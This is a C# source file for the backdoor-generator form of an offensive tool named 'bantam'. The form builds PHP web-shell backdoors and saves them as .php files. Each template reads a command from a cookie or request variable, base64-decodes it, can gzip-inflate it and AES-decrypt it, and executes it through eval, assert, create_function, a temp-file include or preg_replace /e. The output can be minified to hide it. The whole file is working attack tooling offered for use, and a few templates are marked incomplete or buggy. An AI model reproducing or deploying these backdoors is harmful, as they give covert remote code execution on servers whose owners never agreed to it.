using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Windows.Forms;

using bantam.Classes;

namespace bantam.Forms
{
    public partial class BackdoorGenerator : Form
    {
        /// <summary>
        /// 
        /// </summary>
        public static ReadOnlyCollection<string> requestEncryptionModes = new List<string>() {
             "openssl",
             "mcrypt",
        }.AsReadOnly();

        /// <summary>
        /// 
        /// </summary>
        public enum BackdoorTypes
        {
            EVAL = 0,
            ASSERT,
            CREATE_FUNCTION,
            NATIVE_ANON,
            TMP_INCLUDE,
            PREG_REPLACE
        }

        /// <summary>
        /// Backdoor generator constructor
        /// </summary>
        public BackdoorGenerator()
        {
            InitializeComponent();

            comboBoxMethod.SelectedIndex = 0;
            comboBoxVarType.SelectedIndex = 0;

            richTextBoxBackdoor.Text = generateBackdoor();

            foreach(var mode in requestEncryptionModes) {
                comboBoxRequestEncryptionType.Items.Add(mode);
            }
            comboBoxRequestEncryptionType.SelectedIndex = 0;
        }

        /// <summary>
        /// Called everytime a UI element is changed that modifys the backdoor code to update the richtextbox text.
        /// </summary>
        public void UpdateForm()
        {
            string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, chckbxGzipDecodeRequest.Checked, (BackdoorTypes)comboBoxMethod.SelectedIndex);

            if (chkbxMinifyCode.Checked) {
                backdoorCode = Helper.MinifyCode(backdoorCode);
            }

            richTextBoxBackdoor.Text = backdoorCode;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveAsToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();

            saveFileDialog1.Filter = "All files (*.*)|*.*|php files (*.php)|*.php";
            saveFileDialog1.FilterIndex = 2;
            saveFileDialog1.RestoreDirectory = true;

            if (saveFileDialog1.ShowDialog() == DialogResult.OK) {
                File.WriteAllText(saveFileDialog1.FileName, richTextBoxBackdoor.Text);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxEncryptRequest_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxEncryptRequest.Checked) {
                textBoxEncrpytionIV.Enabled = true;
                textBoxEncrpytionKey.Enabled = true;
                checkBoxSendIVInRequest.Enabled = true;
                buttonRandomIV.Enabled = true;
                buttonRandomKey.Enabled = true;
                comboBoxRequestEncryptionType.Enabled = true;
            } else {
                textBoxEncrpytionIV.Enabled = false;
                textBoxEncrpytionKey.Enabled = false;
                textBoxIVVarName.Enabled = false;
                buttonRandomIV.Enabled = false;
                checkBoxSendIVInRequest.Enabled = false;
                buttonRandomKey.Enabled = false;
                comboBoxRequestEncryptionType.Enabled = false;
            }
            UpdateForm();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxSendIVInRequest_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxSendIVInRequest.Checked) {
                textBoxEncrpytionIV.Enabled = false;
                textBoxIVVarName.Enabled = true;
                buttonRandomIV.Enabled = false;
            } else {
                textBoxEncrpytionIV.Enabled = true;
                textBoxIVVarName.Enabled = false;
                buttonRandomIV.Enabled = true;
            }
            UpdateForm();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonRandomKey_Click(object sender, EventArgs e)
        {
            textBoxEncrpytionKey.Text = EncryptionHelper.GetRandomEncryptionKey();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonRandomIV_Click(object sender, EventArgs e)
        {
            textBoxEncrpytionIV.Text = EncryptionHelper.GetRandomEncryptionIV();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="varName"></param>
        /// <param name="varType"></param>
        /// <param name="gzInflateRequest"></param>
        /// <param name="backdoorType"></param>
        /// <returns></returns>
        public string generateBackdoor(string varName = "command", string varType = "COOKIE", bool gzInflateRequest = false, BackdoorTypes backdoorType = BackdoorTypes.EVAL)
        {
            string backdoorResult = string.Empty;
            string gzInflateStart = string.Empty;
            string gzInflateEnd = string.Empty;
            string requestEncryptionStart = string.Empty;
            string requestEncryptionEnd = string.Empty;

            varType = varType.ToUpper();

            if (checkBoxEncryptRequest.Checked) {
                string encryptionKey = textBoxEncrpytionKey.Text;

                //todo set as var?
                if (encryptionKey.Length == 32) {
                    if (checkBoxSendIVInRequest.Checked) {
                        string encryptionIVVarName = textBoxIVVarName.Text;
                        if (string.IsNullOrEmpty(encryptionIVVarName)) {
                            //todo fail must set IV Varname
                        } else {
                            //success!! magic things happen now

                            if (comboBoxRequestEncryptionType.Text == "openssl") {
                                requestEncryptionStart = "@openssl_decrypt(";
                                requestEncryptionEnd = ", 'AES-256-CBC', '" + encryptionKey + "', OPENSSL_RAW_DATA, $_" + varType + "['" + encryptionIVVarName + "'])";
                            } else if (comboBoxRequestEncryptionType.Text == "mcrypt") {
                                requestEncryptionStart = "rtrim(@mcrypt_decrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', ";
                                requestEncryptionEnd = ", MCRYPT_MODE_CBC, $_" + varType + "['" + encryptionIVVarName + "']), \"\0\")";
                            } else {
                                //todo fail
                            }
                        }
                    } else {
                        string encryptionIV = textBoxEncrpytionIV.Text;

                        if (!string.IsNullOrEmpty(encryptionIV) && encryptionIV.Length == 16) {
                            if (comboBoxRequestEncryptionType.Text == "openssl") {
                                requestEncryptionStart = "@openssl_decrypt(";
                                requestEncryptionEnd = ", 'AES-256-CBC', '" + encryptionKey + "', OPENSSL_RAW_DATA, '" + encryptionIV + "')";
                            } else if (comboBoxRequestEncryptionType.Text == "mcrypt") {
                                requestEncryptionStart = "rtrim(@mcrypt_decrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', ";
                                requestEncryptionEnd = ", MCRYPT_MODE_CBC, '" + encryptionIV + "'), \"\0\")";
                            } else {
                                //todo fail
                            }
                        } else {
                            //fail todo
                            //encryption IV must be 16 charectors
                        }
                    }
                }
            }

            if (gzInflateRequest) {
                gzInflateStart = "@gzinflate(";
                gzInflateEnd = ")";
            }

            switch (backdoorType) {
                case BackdoorTypes.EVAL: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
                        break;
                    }

                case BackdoorTypes.ASSERT: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@assert(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
                        break;
                    }

                case BackdoorTypes.CREATE_FUNCTION: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t$a();\r\n}";
                        break;
                    }

                case BackdoorTypes.NATIVE_ANON: {
                        backdoorResult = "todo";
                        break;
                    }

                case BackdoorTypes.TMP_INCLUDE: {
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '." + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
                        break;
                    }

                case BackdoorTypes.PREG_REPLACE: {
                        //todo this looks wrong af and doesnt support gzip
                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@preg_replace(\"/.*/\x65\", " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + varType + "['" + varName + "']" + requestEncryptionEnd + gzInflateEnd + "),'.');\r\n}";
                        break;
                    }
            }

            if (chkbxMinifyCode.Checked) {
                backdoorResult = Helper.MinifyCode(backdoorResult);
            }
            return backdoorResult;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void txtBoxVarName_TextChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void chkbxUseCookie_CheckStateChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void chkbxDisableLogging_CheckStateChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void chckbxGzipDecodeRequest_CheckedChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void chkbxMinifyCode_CheckedChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void comboBoxVarType_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void comboBoxRequestEncryptionType_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void textBoxEncrpytionKey_TextChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void textBoxEncrpytionIV_TextChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }

        private void textBoxIVVarName_TextChanged(object sender, EventArgs e)
        {
            UpdateForm();
        }
    }
}
